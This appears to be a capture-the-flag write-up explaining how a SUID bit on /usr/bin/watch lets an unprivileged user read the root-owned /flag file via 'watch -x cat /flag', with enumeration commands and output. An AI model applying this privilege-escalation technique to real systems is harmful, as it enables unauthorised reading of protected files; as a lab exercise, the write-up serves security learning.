## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/watch`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/watch
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/watch
```

-The `s` in `-rws` indicates it's a SUID binary.
-`watch` runs with **root privileges**.

## üöÄ Exploitation

The `watch` command in Linux is used to run a command repeatedly at fixed intervals and display its output in real time in your terminal.

- watch uses sh -t to run any command but -x allows user to run command directly as watch , as our watch is suid set we must use -x option

```bash
watch -x cat /flag
```

Output:
```
Every 2.0s: cat /flag                                                                                                                                                    program-misuse~watch: Wed Jul 16 12:36:37 2025
